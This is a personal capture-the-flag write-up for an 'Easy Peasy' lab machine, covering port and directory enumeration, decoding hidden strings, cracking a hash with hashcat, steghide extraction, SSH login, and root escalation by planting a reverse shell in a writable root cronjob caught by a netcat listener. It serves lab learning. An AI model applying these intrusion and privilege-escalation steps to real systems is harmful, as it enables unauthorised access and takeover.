<h1 align="center">Challenge 023 - Easy Peasy </h1>
<p align="center">
  <img width="92" height="92" alt="Bildschirmfoto vom 2025-09-18 18-28-59-Photoroom(2)" src="https://github.com/user-attachments/assets/ecd0ad1f-eaf6-4a4b-9d0f-feae7b855123" />
</p>
<p align="center"> <b>Difficulty</b>: 2/10 (Easy) <b>Completed</b>: ✔️ 22.09.2025  </p>

In this CTF we need to do more of the simplistic attack vectors. I already feel quite comfortable with that, so I decided to make this the challenge of the day. 
In the first task we are asked to name all the open ports. Time to scan with nmap once again

```
root@ip-10-10-233-29:~# nmap -p- -sV 10.10.132.69
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-19 09:32 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.132.69
Host is up (0.00014s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
MAC Address: 02:7C:DF:C3:FC:8D (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.31 seconds
```

We have 3 ports in total. One for http, another for ssh and one for a http service once again. The version of nginx that is used is 1.16.1 and Apache is running on the highest port, which is a HTTP Server, a free and open-source web server software that processes HTTP requests from users and serves web content like websites and applications over the internet.

```
Having done the nmap scan we are now tasked to use GoBuster to check for some hidden directories
root@ip-10-10-233-29:~# gobuster dir -u 10.10.132.69 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.132.69
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 169] [--> http://10.10.132.69/hidden/]
/index.html           (Status: 200) [Size: 612]
/robots.txt           (Status: 200) [Size: 43]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

After having used gobuster we quickly realize that one requested directory was permanently moved (301). Let's check it out.

<img width="1184" height="882" alt="Bildschirmfoto vom 2025-09-19 10-51-34" src="https://github.com/user-attachments/assets/7f86f4c3-3d23-4d4a-919d-2ef5785ffca9" />

Uhm... okay. Checking the Page Source didn't reveal anything interesting either, so for a final step I tried to use steg cracker to maybe find a hidden message in the jpg. It was evident after some time that steg cracker wouldn't be able to find anything either though, so I kept on using gobuster to look for some other hidden directories.

```
root@ip-10-10-110-50:~# gobuster dir -u 10.10.135.198/hidden -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.135.198/hidden
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 390]
/whatever             (Status: 301) [Size: 169] [--> http://10.10.135.198/hidden/whatever/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Yet again we are seeing another directory that was hidden. Checking out that directory reveals the following URL.

<img width="681" height="464" alt="image" src="https://github.com/user-attachments/assets/f41c2d0a-9bf9-49ab-9640-9727e9846b47" />

Checking the Page Source yet again reveals a base64 string, which can be determined pretty fast, as it ends with "==" and has a combination of uppercase and lowercase letters and numbers. A simple base64 decoder immediately reveals the first flag.

<img width="630" height="432" alt="Bildschirmfoto vom 2025-09-22 11-38-21" src="https://github.com/user-attachments/assets/a9f92396-492a-4a8e-921c-3a46864bfd3f" />

Having done that we are tasked to further enumerate the machine to find the second flag. There are no further directories in *http://10.10.135.198/hidden/whatever/* even when using gobuster, so we start checking out the other services in hopes of having more look with those.

When we did the nmap scan there was an Apache service that we are still able to enumerate. Checking out the website shows us the default page. Time to use gobuster.

```
root@ip-10-10-110-50:~# gobuster dir -u http://10.10.135.198:65524 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.135.198:65524
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 281]
/.hta                 (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]a18672860d0510e5ab6699730763b250
/index.html           (Status: 200) [Size: 10818]
/robots.txt           (Status: 200) [Size: 153]
/server-status        (Status: 403) [Size: 281]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

I decided to check out the robots.txt as this seemed to be the only feasible directory that could lead to anything and indeed

<img width="490" height="225" alt="image" src="https://github.com/user-attachments/assets/1a1764b0-bdb9-4c70-bc55-3e8b4d0cd6c1" />

As the file suggests only the specific user-agent ** is allowed access to certain parts of the website that are otherwise disallowed for all other user agents. For some reason I thought we would need to use Burp Suite and change the User-Agent to said credentials, but this was an md5 hash, so it really was just about decrypting with a tool again. My bad

<img width="232" height="117" alt="Bildschirmfoto vom 2025-09-22 12-27-48" src="https://github.com/user-attachments/assets/0063b4af-58b3-4005-88aa-6411ce81bd66" />

Checking the Page Source of the Apache default site further I realize that the third flag stands there in plain sight when looking clearly.  

There is also a hidden paragraph that contains a hidden base64 encoded value. 

<img width="663" height="123" alt="image" src="https://github.com/user-attachments/assets/dc4a9370-be85-4374-a105-0c628ac7a764" />

The weird thing is that the usual base64 decryption tools don't seem to work anymore. After a while I found out that there are other binary-to-text encoding schemes I had to consider like

- base36 (Numbers 0-9 and Latin letters A-Z)
- base58 (Similar to Base64, but modified to avoid both non-alphanumeric characters (+ and /) and letters that might look ambiguous when printed (0 – zero, I – capital i, O – capital o and l – lower-case L).)
- base62 (Similar to Base64, but contains only alphanumeric characters.)

Yet again something I was not aware of, but will keep in mind from now on. I started to decode with base62

<img width="613" height="320" alt="Bildschirmfoto vom 2025-09-22 13-18-07" src="https://github.com/user-attachments/assets/2f3e1a25-96ed-4a7f-b18d-0f5128c7ad62" />

That was the right one! It gives us the lead for the hidden directory. When appending it into the URL we are greeted by this site

<img width="889" height="881" alt="Bildschirmfoto vom 2025-09-22 13-21-23" src="https://github.com/user-attachments/assets/4fde61a1-76ad-4c78-a9b6-90e0889d69ee" />

Neat. Time to check out the Page Source again. Once again a hash is waving at us, waiting to be cracked. The task expects us to use the easypeasy.txt file for that. We need to first find out what Hash Type we are dealing with here, as SHA2-256 isn't the right one, even though the Hash Analyzer recognizes it as such.

 <img width="331" height="505" alt="image" src="https://github.com/user-attachments/assets/53329474-0d86-4de9-a6b2-3998af243a93" />

I checked out all these types and finally concluded that GOST R 34.11-94 was the right one. The Hash Type for that in Hashcat is 6900.
```
lorenzo@lorenzo-HP-Laptop-15s-eq2xxx:~$ hashcat -m 6900 -a 0 Hash/hash.txt Hash/easypeasy.txt --show
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81:mypasswordforthatjob
```

We succesfully recovered the password. As I was not sure for what exactly we could use that password for I just decided to analyze the jpg file and possibly extract some hidden data. If the image contains any embedded data and a correct password is provided, Steghide would be able to extract the data to the current directory

```
root@ip-10-10-110-50:~/Downloads# steghide extract -sf binarycodepixabay.jpg
Enter passphrase: 
wrote extracted data to "secrettext.txt".
```

That seems to have worked. We check out the text file, which contains the username and some binary encoded password. Seems like we have to recover the plaintext for that first.

```
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

<img width="545" height="390" alt="Bildschirmfoto vom 2025-09-22 14-13-22" src="https://github.com/user-attachments/assets/97356a10-7962-4259-b389-f0ef973b81ad" />

We are succesful once again. Now the ssh can be accessed. 

```
root@ip-10-10-110-50:~# ssh -p 6498 boring@10.10.135.198
The authenticity of host '[10.10.135.198]:6498 ([10.10.135.198]:6498)' can't be established.
ECDSA key fingerprint is SHA256:hnBqxfTM/MVZzdifMyu9Ww1bCVbnzSpnrdtDQN6zSek.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.135.198]:6498' (ECDSA) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized	       **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.135.198's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls
user.txt
```

I tried cat'ing the user.txt but once again we receive a value that was tampered with. We are given the hint that the characters were rotated or something similar happened. After thinking about it for a while I realized that if the correct value starts with "flag" every character was moved by the value of 13 in ASCII representation. There is a letter-substitution cipher that does exactly that. It's called ROT13. I immediately checked up on a tool that could reverse that process.

<img width="1243" height="259" alt="Bildschirmfoto vom 2025-09-22 14-31-40" src="https://github.com/user-attachments/assets/be4b1aeb-a5f3-476f-ac76-33ef41b36f19" />

You can also write a simple Python script for that. I may also add one in the near future, as this is fairly simple. Anyways. The last thing to do was the escalation of privileges. 

To start with I checked the SUID binaries

```
boring@kral4-PC:/$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/pppd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/bin/ping
/bin/mount
/bin/fusermount
/bin/su
/bin/umount
```

No luck here. Maybe checking the log history of *boring* could lead to something. But I didn't even bother to check as I already saw that somebody tampered with the history and cleaned up everything. Too bad. Later I realized that I could escalate my privileges through a vulnerable cronjob as explained by the task itself.

First I checked crontab to see what shells were running

```
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

As we can see there seems to be some shell we could take advantage of. Checking out that directory also confirms to us the question if we could modify the file

```
boring@kral4-PC:/var/www$ ls -la
total 16
drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
```

We can write in that shell. Neat. Let's add a Bash reverse shell with nano and then add our netcat listener

<img width="589" height="150" alt="image" src="https://github.com/user-attachments/assets/aba2cb83-0a8b-421c-aa89-4119dc960e36" />

That seemed to have worked


```
root@ip-10-10-188-57:~# nc -lvnp 1337
Listening on 0.0.0.0 1337
Connection received on 10.10.135.198 45062
bash: cannot set terminal process group (2349): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# whoami
whoami
root
root@kral4-PC:/var/www# 
```

Now we only need to cat the root.txt, which we can find in the root directory. *ls -la* reveals the text file to us. With that the challenge is done. 

## Lessons Learned
This was the first time I got to make use of a vulnerable cronjob, so that was exiting. I'm getting the hang of it, when it comes to reverse shells and listeners, but still got confused by steganography, even though I already had a challenge like that before. I needed to understand the difference between steghide and stegcracker. Enumerating with an already hidden directory was also new to me. Nonetheless this was a lot of fun and helped me get acquainted with a lot of encryption tools and strategies in regards to privilege esacalation.
